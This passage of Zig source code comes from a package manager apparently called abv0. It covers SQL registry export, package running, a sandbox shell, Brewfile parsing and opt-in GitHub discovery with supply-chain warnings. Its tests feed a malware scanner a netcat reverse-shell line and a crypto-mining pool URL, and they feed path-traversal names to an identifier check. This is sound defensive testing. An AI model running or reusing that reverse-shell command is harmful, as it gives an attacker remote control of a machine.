    /// "zero-copy memory-mapped index".
    pub fn exportRegistry(
        self: *Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
    ) !void {
        const json_path = try std.fs.path.join(a, &.{ self.registry_root, "index.json" });
        defer a.free(json_path);
        const index_path = try std.fs.path.join(a, &.{ self.registry_root, "index.abv" });
        defer a.free(index_path);

        term.progress("compiling binary index (index.abv)", 1, 3);
        const stamp = abvindex.Stamp.ofFile(json_path) catch abvindex.Stamp{ .size = 0, .mtime_ns = 0 };
        try abvindex.build(a, reg, index_path, stamp);

        const idx_size = (try std.fs.cwd().statFile(index_path)).size;
        term.print("  index.abv    {d} packages, {d} bytes, mmap-backed\n", .{ reg.count(), idx_size });

        term.progress("writing SQL export (registry.sql)", 2, 3);
        const sql_path = try std.fs.path.join(a, &.{ self.registry_root, "registry.sql" });
        defer a.free(sql_path);
        try self.writeSql(a, reg, sql_path);
        term.print("  registry.sql {d} rows\n", .{reg.count()});

        term.progress("materialising sqlite database if available", 3, 3);
        const db_path = try std.fs.path.join(a, &.{ self.registry_root, "registry.db" });
        defer a.free(db_path);
        if (self.buildSqlite(a, sql_path, db_path)) {
            term.print("  registry.db  built with the sqlite3 CLI\n", .{});
        } else {
            term.print("  registry.db  {s}skipped{s} (sqlite3 not installed; registry.sql is portable)\n", .{ term.dim, term.reset });
        }
    }

    fn writeSql(
        self: *Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        path: []const u8,
    ) !void {
        _ = self;
        _ = a;
        const file = try std.fs.cwd().createFile(path, .{ .mode = platform.mode_private });
        defer file.close();
        var bw = std.io.bufferedWriter(file.writer());
        const w = bw.writer();

        try w.writeAll(
            \\BEGIN TRANSACTION;
            \\CREATE TABLE IF NOT EXISTS packages (
            \\  name TEXT PRIMARY KEY, version TEXT, description TEXT, homepage TEXT, license TEXT);
            \\CREATE TABLE IF NOT EXISTS platforms (
            \\  package TEXT, platform TEXT, url TEXT, sha256 TEXT, archive_type TEXT, bin_path TEXT,
            \\  PRIMARY KEY (package, platform));
            \\
        );

        for (reg.packages) |pkg| {
            try w.writeAll("INSERT OR REPLACE INTO packages VALUES (");
            try writeSqlString(w, pkg.name);
            try w.writeAll(",");
            try writeSqlString(w, pkg.version);
            try w.writeAll(",");
            try writeSqlString(w, pkg.description);
            try w.writeAll(",");
            try writeSqlString(w, pkg.homepage);
            try w.writeAll(",");
            try writeSqlString(w, pkg.license);
            try w.writeAll(");\n");

            for (pkg.platforms) |p| {
                try w.writeAll("INSERT OR REPLACE INTO platforms VALUES (");
                try writeSqlString(w, pkg.name);
                try w.writeAll(",");
                try writeSqlString(w, p.name);
                try w.writeAll(",");
                try writeSqlString(w, p.url);
                try w.writeAll(",");
                try writeSqlString(w, p.sha256);
                try w.writeAll(",");
                try writeSqlString(w, p.archive_type);
                try w.writeAll(",");
                try writeSqlString(w, p.bin_path);
                try w.writeAll(");\n");
            }
        }
        try w.writeAll("COMMIT;\n");
        try bw.flush();
    }

    /// Escape by doubling single quotes. The original interpolated raw
    /// descriptions into `'{s}'`, so any apostrophe produced broken SQL.
    fn writeSqlString(w: anytype, s: []const u8) !void {
        try w.writeByte('\'');
        for (s) |c| {
            if (c == '\'') try w.writeByte('\'');
            try w.writeByte(c);
        }
        try w.writeByte('\'');
    }

    fn buildSqlite(self: *Store, a: std.mem.Allocator, sql_path: []const u8, db_path: []const u8) bool {
        _ = self;
        std.fs.cwd().deleteFile(db_path) catch {};

        const sql = std.fs.cwd().readFileAlloc(a, sql_path, 16 * 1024 * 1024) catch return false;
        defer a.free(sql);

        var child = std.process.Child.init(&.{ "sqlite3", db_path }, a);
        child.stdin_behavior = .Pipe;
        child.stdout_behavior = .Ignore;
        child.stderr_behavior = .Ignore;
        child.spawn() catch return false;

        if (child.stdin) |stdin| {
            stdin.writeAll(sql) catch {};
            stdin.close();
            child.stdin = null;
        }
        const term_res = child.wait() catch return false;
        return term_res == .Exited and term_res.Exited == 0;
    }

    // -----------------------------------------------------------------------
    // run / shell
    // -----------------------------------------------------------------------

    /// Resolve a user-supplied name to a package, whether they typed the
    /// package name (`ripgrep`) or the executable name (`rg`).
    pub fn resolveRequest(reg: *const registry.Registry, name: []const u8) ?Package {
        if (reg.get(name)) |p| return p;
        return reg.findByBin(name);
    }

    pub fn ensureInstalled(
        self: *Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        name: []const u8,
        platform_name: []const u8,
        opts: InstallOptions,
    ) !Package {
        if (resolveRequest(reg, name)) |pkg| {
            if (!self.isInstalled(pkg, platform_name)) {
                try self.install(pkg, platform_name, opts);
            }
            return pkg;
        }
        return self.installDynamic(a, name, platform_name, opts);
    }

    /// Path of the linked executable for `pkg`, inside ~/.abv0/bin.
    fn linkedBinPath(self: *const Store, a: std.mem.Allocator, pkg: Package) ![]u8 {
        // `abv0 run ripgrep` must launch `rg`. The original looked for a file
        // literally named after the package and failed for every package whose
        // executable differs from its name.
        const exe = pkg.primaryBin() orelse pkg.name;
        const name = try std.fmt.allocPrint(a, "{s}{s}", .{ exe, platform.exe_suffix });
        defer a.free(name);
        return std.fs.path.join(a, &.{ self.bin_root, name });
    }

    pub fn runPackage(
        self: *Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        name: []const u8,
        args: []const []const u8,
        platform_name: []const u8,
        opts: InstallOptions,
    ) !u8 {
        const pkg = try self.ensureInstalled(a, reg, name, platform_name, opts);

        const bin = try self.linkedBinPath(a, pkg);
        defer a.free(bin);

        std.fs.cwd().access(bin, .{}) catch {
            term.err("{s}error{s}: '{s}' is installed but no executable is linked\n", .{ term.red, term.reset, pkg.name });
            return StoreError.ExecutableNotFound;
        };

        var argv = std.ArrayList([]const u8).init(a);
        defer argv.deinit();
        try argv.append(bin);
        try argv.appendSlice(args);

        term.flush();
        var child = std.process.Child.init(argv.items, a);
        const res = try child.spawnAndWait();
        return switch (res) {
            .Exited => |c| c,
            else => 1,
        };
    }

    pub fn spawnShell(
        self: *Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        names: []const []const u8,
        platform_name: []const u8,
        opts: InstallOptions,
    ) !u8 {
        var pkgs = std.ArrayList(Package).init(a);
        defer pkgs.deinit();
        for (names) |n| {
            try pkgs.append(try self.ensureInstalled(a, reg, n, platform_name, opts));
        }

        const dir_name = try std.fmt.allocPrint(a, "shell-{d}-{x}", .{ std.time.timestamp(), std.crypto.random.int(u32) });
        defer a.free(dir_name);
        const base = try std.fs.path.join(a, &.{ self.shells_root, dir_name });
        defer a.free(base);
        const sandbox_bin = try std.fs.path.join(a, &.{ base, "bin" });
        defer a.free(sandbox_bin);

        try platform.makeSecureDir(sandbox_bin);
        defer std.fs.cwd().deleteTree(base) catch {};

        for (pkgs.items) |pkg| {
            for (pkg.bin) |b| {
                const fname = try std.fmt.allocPrint(a, "{s}{s}", .{ b, platform.exe_suffix });
                defer a.free(fname);
                const src = try std.fs.path.join(a, &.{ self.bin_root, fname });
                defer a.free(src);
                const dst = try std.fs.path.join(a, &.{ sandbox_bin, fname });
                defer a.free(dst);
                _ = platform.fastLink(src, dst) catch continue;
            }
        }

        var env = try std.process.getEnvMap(a);
        defer env.deinit();

        const sep = if (platform.is_windows) ";" else ":";
        const old_path = env.get("PATH") orelse "";
        const new_path = try std.fmt.allocPrint(a, "{s}{s}{s}", .{ sandbox_bin, sep, old_path });
        defer a.free(new_path);
        try env.put("PATH", new_path);
        try env.put("ABV0_SHELL", "1");

        const shell = try platform.defaultShell(a);
        defer a.free(shell);

        term.print("{s}entering abv0 sandbox shell{s} - type 'exit' to leave\n", .{ term.magenta, term.reset });
        term.flush();

        var child = std.process.Child.init(&.{shell}, a);
        child.env_map = &env;
        const res = try child.spawnAndWait();

        term.print("{s}sandbox dissolved{s}\n", .{ term.dim, term.reset });
        return switch (res) {
            .Exited => |c| c,
            else => 1,
        };
    }

    // -----------------------------------------------------------------------
    // Bundle
    // -----------------------------------------------------------------------

    /// Streaming, line-by-line Brewfile parser.
    ///
    /// The v1.5.0 changelog claims a "Streaming Zero-Allocation Bundle Parser"
    /// built on std.io.bufferedReader. The code actually called
    /// readToEndAlloc(2 MB). This is the advertised implementation.
    pub fn bundleInstall(
        self: *Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        file_path: []const u8,
        platform_name: []const u8,
        opts: InstallOptions,
    ) !void {
        const file = std.fs.cwd().openFile(file_path, .{}) catch |e| {
            term.err("{s}error{s}: cannot open bundle '{s}': {s}\n", .{ term.red, term.reset, file_path, @errorName(e) });
            return e;
        };
        defer file.close();

        var buffered = std.io.bufferedReader(file.reader());
        const reader = buffered.reader();

        var line_buf: [4096]u8 = undefined;
        var names = std.ArrayList([]const u8).init(a);
        defer names.deinit();

        var line_no: usize = 0;
        while (true) {
            const maybe = reader.readUntilDelimiterOrEof(&line_buf, '\n') catch |e| switch (e) {
                error.StreamTooLong => {
                    line_no += 1;
                    term.err("{s}warning{s}: {s}:{d} line too long, skipped\n", .{ term.yellow, term.reset, file_path, line_no });
                    continue;
                },
                else => return e,
            };
            const raw = maybe orelse break;
            line_no += 1;

            const line = std.mem.trim(u8, raw, " \t\r");
            if (line.len == 0 or line[0] == '#') continue;

            var parts = std.mem.tokenizeAny(u8, line, " \t");
            const first = parts.next() orelse continue;

            const candidate = if (std.mem.eql(u8, first, "brew") or std.mem.eql(u8, first, "cask"))
                (parts.next() orelse continue)
            else
                first;

            const name = std.mem.trim(u8, candidate, "\"',");
            if (name.len == 0) continue;

            if (resolveRequest(reg, name) == null) {
                term.err("{s}warning{s}: {s}:{d} unknown package '{s}', skipped\n", .{ term.yellow, term.reset, file_path, line_no, name });
                continue;
            }
            try names.append(try a.dupe(u8, name));
        }

        if (names.items.len == 0) {
            term.print("no installable entries in {s}\n", .{file_path});
            return;
        }

        // Honour declared dependencies where the registry provides them.
        const ordered = registry.resolveOrder(a, reg, names.items) catch blk: {
            var fallback = std.ArrayList(Package).init(a);
            for (names.items) |n| {
                if (resolveRequest(reg, n)) |p| try fallback.append(p);
            }
            break :blk try fallback.toOwnedSlice();
        };
        defer a.free(ordered);

        term.print("installing {d} packages from {s}\n\n", .{ ordered.len, file_path });
        for (ordered) |pkg| {
            self.install(pkg, platform_name, opts) catch |e| {
                term.err("{s}error{s}: {s}: {s}\n", .{ term.red, term.reset, pkg.name, @errorName(e) });
            };
        }
    }

    pub fn bundleDump(
        self: *Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        file_path: []const u8,
        force: bool,
        platform_name: []const u8,
    ) !void {
        if (!force) {
            if (std.fs.cwd().access(file_path, .{})) |_| {
                term.err("{s}error{s}: '{s}' exists; pass --force to overwrite\n", .{ term.red, term.reset, file_path });
                return;
            } else |_| {}
        }

        const file = try std.fs.cwd().createFile(file_path, .{ .mode = platform.mode_public });
        defer file.close();
        var bw = std.io.bufferedWriter(file.writer());
        const w = bw.writer();

        try w.print("# Generated by abv0 for {s}\n", .{platform_name});
        var count: usize = 0;
        for (reg.packages) |pkg| {
            if (!self.isInstalled(pkg, platform_name)) continue;
            const kw = if (pkg.app_bundles.len > 0) "cask" else "brew";
            try w.print("{s} \"{s}\"\n", .{ kw, pkg.name });
            count += 1;
        }
        try bw.flush();
        _ = a;
        term.print("exported {d} packages to {s}\n", .{ count, file_path });
    }

    // -----------------------------------------------------------------------
    // Dynamic discovery
    // -----------------------------------------------------------------------

    /// Resolve an unlisted package by searching GitHub.
    ///
    /// This is inherently dangerous: it downloads and executes whatever the
    /// top search hit happens to be, with no checksum to verify against, which
    /// makes it a typosquatting vector. The original did it silently for any
    /// unknown name. It now requires explicit opt-in.
    pub fn installDynamic(
        self: *Store,
        a: std.mem.Allocator,
        name: []const u8,
        platform_name: []const u8,
        opts: InstallOptions,
    ) !Package {
        if (!safepath.isValidId(name)) return StoreError.InvalidPackageIdentifier;

        if (!opts.allow_unverified) {
            term.err(
                \\{s}error{s}: '{s}' is not in the registry.
                \\  abv0 can search GitHub for it, but the result cannot be checksum-verified
                \\  and name-similar repositories are a known supply-chain attack.
                \\  Re-run with --allow-unverified to opt in.
                \\
            , .{ term.red, term.reset, name });
            return StoreError.RefusedUnverifiedInstall;
        }

        term.print("searching GitHub for '{s}'...\n", .{name});

        const encoded = try net.urlEncode(a, name);
        defer a.free(encoded);

        // The name is percent-encoded, so it cannot inject extra query
        // parameters into the API request.
        const search_url = try std.fmt.allocPrint(
            a,
            "https://api.github.com/search/repositories?q={s}+in:name&sort=stars&order=desc&per_page=5",
            .{encoded},
        );
        defer a.free(search_url);

        const body = try net.fetchToString(a, search_url, 4 * 1024 * 1024, .{});
        defer a.free(body);

        const parsed = std.json.parseFromSlice(std.json.Value, a, body, .{}) catch return error.DynamicDiscoveryFailed;
        defer parsed.deinit();

        const root = switch (parsed.value) {
            .object => |o| o,
            else => return error.DynamicDiscoveryFailed,
        };

        // A rate-limit response has no "items" and used to hit a `.?` unwrap.
        if (root.get("message")) |m| {
            if (m == .string) {
                term.err("{s}error{s}: GitHub API: {s}\n", .{ term.red, term.reset, m.string });
                return error.DynamicDiscoveryFailed;
            }
        }

        const items = switch (root.get("items") orelse return error.DynamicDiscoveryFailed) {
            .array => |arr| arr,
            else => return error.DynamicDiscoveryFailed,
        };
        if (items.items.len == 0) return error.DynamicDiscoveryFailed;

        const repo = switch (items.items[0]) {
            .object => |o| o,
            else => return error.DynamicDiscoveryFailed,
        };

        const full_name = switch (repo.get("full_name") orelse return error.DynamicDiscoveryFailed) {
            .string => |s| s,
            else => return error.DynamicDiscoveryFailed,
        };
        // full_name goes into a URL path; keep it to owner/repo shape.
        if (!isRepoFullName(full_name)) return error.DynamicDiscoveryFailed;

        const default_branch = blk: {
            const v = repo.get("default_branch") orelse break :blk "main";
            break :blk switch (v) {
                .string => |s| s,
                else => "main",
            };
        };
        const description = blk: {
            const v = repo.get("description") orelse break :blk "";
            break :blk switch (v) {
                .string => |s| s,
                else => "",
            };
        };

        term.print("  resolved to {s}{s}{s}\n", .{ term.bold, full_name, term.reset });

        const rel_url = try std.fmt.allocPrint(a, "https://api.github.com/repos/{s}/releases/latest", .{full_name});
        defer a.free(rel_url);

        var version: []const u8 = "0.0.0";
        var download_url: ?[]const u8 = null;
        var archive_type: []const u8 = "raw";

        if (net.fetchToString(a, rel_url, 8 * 1024 * 1024, .{})) |rel_body| {
            defer a.free(rel_body);
            if (std.json.parseFromSlice(std.json.Value, a, rel_body, .{})) |rel_parsed| {
                defer rel_parsed.deinit();
                if (rel_parsed.value == .object) {
                    const rel = rel_parsed.value.object;
                    if (rel.get("tag_name")) |t| {
                        if (t == .string) {
                            const cleaned = std.mem.trimLeft(u8, t.string, "v");
                            if (safepath.isValidId(cleaned)) version = try a.dupe(u8, cleaned);
                        }
                    }
                    if (rel.get("assets")) |assets_v| {
                        if (assets_v == .array) {
                            for (assets_v.array.items) |asset_v| {
                                if (asset_v != .object) continue;
                                const asset = asset_v.object;
                                const aname = switch (asset.get("name") orelse continue) {
                                    .string => |s| s,
                                    else => continue,
                                };
                                const aurl = switch (asset.get("browser_download_url") orelse continue) {
                                    .string => |s| s,
                                    else => continue,
                                };
                                if (!assetMatchesPlatform(aname, platform_name)) continue;
                                if (!net.isSafeUrl(aurl)) continue;

                                download_url = try a.dupe(u8, aurl);
                                archive_type = if (archive.Kind.fromFilename(aname)) |k| switch (k) {
                                    .tar_gz => "tar.gz",
                                    .tar_xz => "tar.xz",
                                    .tar_zst => "tar.zst",
                                    .zip => "zip",
                                    .dmg => "dmg",
                                    .tar => "tar",
                                    .raw => "raw",
                                } else "raw";
                                break;
                            }
                        }
                    }
                }
            } else |_| {}
        } else |_| {}

        if (download_url == null) {
            // The original hardcoded refs/heads/master, which 404s on every
            // repository that has since renamed its default branch.
            download_url = try std.fmt.allocPrint(
                a,
                "https://github.com/{s}/archive/refs/heads/{s}.tar.gz",
                .{ full_name, default_branch },
            );
            archive_type = "tar.gz";
            term.print("  no matching release asset; using {s} source snapshot\n", .{default_branch});
        }

        const plats = try a.alloc(registry.PlatformInfo, 1);
        plats[0] = .{
            .name = platform_name,
            .url = download_url.?,
            .sha256 = registry.sha256_skip,
            .archive_type = archive_type,
            .bin_path = "",
        };
        const bins = try a.alloc([]const u8, 1);
        bins[0] = name;

        const pkg = Package{
            .name = name,
            .version = version,
            .description = description,
            .homepage = "",
            .license = "unknown",
            .bin = bins,
            .platforms = plats,
        };

        try self.install(pkg, platform_name, opts);
        return pkg;
    }

    fn isRepoFullName(s: []const u8) bool {
        if (s.len == 0 or s.len > 256) return false;
        var slashes: usize = 0;
        for (s) |c| {
            switch (c) {
                'a'...'z', 'A'...'Z', '0'...'9', '-', '_', '.' => {},
                '/' => slashes += 1,
                else => return false,
            }
        }
        return slashes == 1 and s[0] != '/' and s[s.len - 1] != '/';
    }

    fn assetMatchesPlatform(asset_name: []const u8, platform_name: []const u8) bool {
        const want_macos = std.mem.indexOf(u8, platform_name, "macos") != null;
        const want_linux = std.mem.indexOf(u8, platform_name, "linux") != null;
        const want_windows = std.mem.indexOf(u8, platform_name, "windows") != null;
        const want_arm = std.mem.indexOf(u8, platform_name, "aarch64") != null;

        const has = struct {
            fn f(hay: []const u8, needle: []const u8) bool {
                return std.ascii.indexOfIgnoreCase(hay, needle) != null;
            }
        }.f;

        if (has(asset_name, ".sha256") or has(asset_name, ".asc") or has(asset_name, ".sig")) return false;

        if (want_macos) {
            if (!(has(asset_name, "darwin") or has(asset_name, "macos") or
                has(asset_name, "osx") or has(asset_name, "apple"))) return false;
        } else if (want_linux) {
            if (!has(asset_name, "linux")) return false;
            if (has(asset_name, "android")) return false;
        } else if (want_windows) {
            if (!(has(asset_name, "windows") or has(asset_name, "win64") or has(asset_name, "-pc-"))) return false;
        }

        const is_arm = has(asset_name, "aarch64") or has(asset_name, "arm64");
        const is_x64 = has(asset_name, "x86_64") or has(asset_name, "amd64") or has(asset_name, "x64");
        const universal = has(asset_name, "universal");

        if (universal) return true;
        if (want_arm) return is_arm or !is_x64;
        return is_x64 or !is_arm;
    }
};

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

const testing = std.testing;

test "storeDirName rejects hostile identifiers" {
    const a = testing.allocator;

    const ok = try Store.storeDirName(a, .{ .name = "jq", .version = "1.7.1" }, "x86_64-linux");
    defer a.free(ok);
    try testing.expectEqualStrings("jq-1.7.1-x86_64-linux", ok);

    try testing.expectError(
        StoreError.InvalidPackageIdentifier,
        Store.storeDirName(a, .{ .name = "../../etc", .version = "1.0" }, "x86_64-linux"),
    );
    try testing.expectError(
        StoreError.InvalidPackageIdentifier,
        Store.storeDirName(a, .{ .name = "jq", .version = "../.." }, "x86_64-linux"),
    );
    try testing.expectError(
        StoreError.InvalidPackageIdentifier,
        Store.storeDirName(a, .{ .name = "jq", .version = "1.0" }, "../../../tmp"),
    );
}

test "scanFile scores known malware patterns and stays clean otherwise" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);

    const bad = try std.fs.path.join(testing.allocator, &.{ root, "bad.sh" });
    defer testing.allocator.free(bad);
    {
        const f = try std.fs.cwd().createFile(bad, .{});
        defer f.close();
        try f.writeAll("#!/bin/sh\nnc -e /bin/sh 10.0.0.1 4444\nstratum+tcp://pool.example:3333\n");
    }
    var t1 = try Store.scanFile(testing.allocator, bad);
    defer t1.deinit();
    try testing.expect(t1.score >= 90);
    try testing.expect(t1.reasons.items.len >= 2);

    const good = try std.fs.path.join(testing.allocator, &.{ root, "good.sh" });
    defer testing.allocator.free(good);
    {
        const f = try std.fs.cwd().createFile(good, .{});
        defer f.close();
        try f.writeAll("#!/bin/sh\necho hello world\n");
    }
    var t2 = try Store.scanFile(testing.allocator, good);
    defer t2.deinit();
    try testing.expectEqual(@as(u32, 0), t2.score);
}

test "scanFile catches a signature straddling a read boundary" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);
    const p = try std.fs.path.join(testing.allocator, &.{ root, "split.bin" });
    defer testing.allocator.free(p);

    {
        const f = try std.fs.cwd().createFile(p, .{});
        defer f.close();
        // Land "stratum+tcp://" exactly across the 256 KiB chunk boundary.
        const pad = 256 * 1024 - 7;
        const filler = try testing.allocator.alloc(u8, pad);
        defer testing.allocator.free(filler);
        @memset(filler, 'A');
        try f.writeAll(filler);
        try f.writeAll("stratum+tcp://pool");
    }

    var t = try Store.scanFile(testing.allocator, p);
    defer t.deinit();
    try testing.expect(t.score > 0);
}

test "sql string escaping neutralises quotes" {
    var buf = std.ArrayList(u8).init(testing.allocator);
    defer buf.deinit();
    try Store.writeSqlString(buf.writer(), "it's a 'test'");
    try testing.expectEqualStrings("'it''s a ''test'''", buf.items);
}

test "installedVersions parses store directory names" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);

    var s = Store{
        .allocator = testing.allocator,
        .home = try testing.allocator.dupe(u8, root),
        .root = try testing.allocator.dupe(u8, root),
        .store_root = try testing.allocator.dupe(u8, root),
        .bin_root = try testing.allocator.dupe(u8, root),
        .shells_root = try testing.allocator.dupe(u8, root),
        .apps_root = try testing.allocator.dupe(u8, root),
        .registry_root = try testing.allocator.dupe(u8, root),
        .locks_root = try testing.allocator.dupe(u8, root),
    };
    defer s.deinit();

    try tmp.dir.makePath("jq-1.6-x86_64-linux");
    try tmp.dir.makePath("jq-1.7.1-x86_64-linux");
    try tmp.dir.makePath("jq-1.7.1-aarch64-macos");
    try tmp.dir.makePath("other-2.0-x86_64-linux");

    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();

    const found = try s.installedVersions(arena.allocator(), "jq", "x86_64-linux");
    try testing.expectEqual(@as(usize, 2), found.len);

    var newest: []const u8 = found[0].version;
    for (found[1..]) |f| {
        if (registry.compareVersions(f.version, newest) == .gt) newest = f.version;
    }
    try testing.expectEqualStrings("1.7.1", newest);
}
